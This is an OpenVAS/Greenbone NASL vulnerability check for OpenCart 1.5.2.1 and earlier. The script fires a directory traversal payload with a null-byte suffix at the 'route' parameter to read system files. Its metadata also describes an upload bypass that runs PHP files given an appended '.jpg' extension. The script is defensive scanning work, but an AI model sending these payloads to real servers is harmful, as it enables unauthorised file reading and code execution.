CPE = "cpe:/a:opencart:opencart";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802751" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_bugtraq_id( 52957 );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2012-04-18 18:47:56 +0530 (Wed, 18 Apr 2012)" );
	script_name( "OpenCart Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/48762" );
	script_xref( name: "URL", value: "http://www.waraxe.us/advisory-84.html" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/522240" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "opencart_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "OpenCart/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to upload PHP scripts
and include arbitrary files from local resources via directory traversal attacks." );
	script_tag( name: "affected", value: "OpenCart version 1.5.2.1 and prior" );
	script_tag( name: "insight", value: "The flaws are due to

  - An input passed via the 'route' parameter to index.php is not properly verified before being used to include
    files.

  - 'admin/controller/catalog/download.php' script does not properly validate uploaded files, which can be
    exploited to execute arbitrary PHP code by uploading a PHP file with an appended '.jpg' file extension." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
since the disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "OpenCart is prone to multiple vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/index.php?route=" + crap( data: "..%5C", length: 3 * 15 ) + files[file] + "%00";
	if(http_vuln_check( port: port, url: url, pattern: file, check_header: TRUE )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

